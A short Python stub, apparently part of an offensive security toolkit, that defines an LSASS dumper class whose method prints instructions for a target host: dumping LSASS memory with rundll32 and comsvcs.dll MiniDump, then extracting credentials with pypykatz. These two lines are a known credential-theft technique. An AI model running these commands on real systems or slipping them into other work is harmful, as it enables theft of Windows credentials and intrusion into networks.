"""LSASS dump engine stub."""
class LsassDumper:
    def __init__(self, console=None):
        self.console = console

    def dump(self, target_ip: str, username: str, password: str, domain: str):
        _p = (lambda m: self.console.print(m)) if self.console else print
        _p(f"[bold red]𓂀 LSASS Dump → {target_ip}[/bold red]")
        _p(f"  [dim]Run on target:[/dim]")
        _p(f"  [green]rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> lsass.dmp full[/green]")
        _p(f"  [green]pypykatz lsa minidump lsass.dmp[/green]")
